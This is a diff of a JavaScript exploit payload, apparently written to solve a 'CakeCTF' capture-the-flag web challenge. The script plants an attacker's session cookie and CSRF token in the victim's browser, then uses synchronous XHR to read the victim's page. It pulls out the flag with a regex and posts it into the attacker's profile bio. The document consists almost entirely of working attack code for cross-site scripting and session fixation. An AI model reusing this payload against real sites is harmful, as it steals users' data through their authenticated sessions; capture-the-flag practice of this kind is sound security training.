@@ -4,16 +4,15 @@ document.cookie = "session=eyJjc3JmX3Rva2VuIjoiMGIxMzYwMjc5YWFlYTAyOTU2OTNlNmE1M
 // Set csrf_token to our csrf_token
 let csrf = "IjBiMTM2MDI3OWFhZWEwMjk1NjkzZTZhNTAxNWNkMjdkNGNhMDliYjgi.Yxhqhg.fpyT9r_MmHtm_4ZL-iZzgShCDoc";
 
-// init xhr
+// Init xhr
 xhr = new XMLHttpRequest();
 
 
-// Get admin's profile link
-let url;
+// Get flag
+let bio;
 xhr.open("GET", "/", false);
 xhr.onload = function () {
-    url = /"http:\/\/localhost:8003\/profile\/.*"/.exec(xhr.response)[0];
-    console.log(url);
+    bio = /CakeCTF{.*}/.exec(xhr.response)[0];
 };
 xhr.send(null);
 
@@ -21,6 +20,6 @@ xhr.send(null);
 // Post flag to our profile
 xhr.open("POST", "/api/user/update", false);
 xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded')
-data = `bio=${url}&csrf_token=${csrf}`;
+data = `bio=${bio}&csrf_token=${csrf}`;
 console.log(data);
 xhr.send(data);
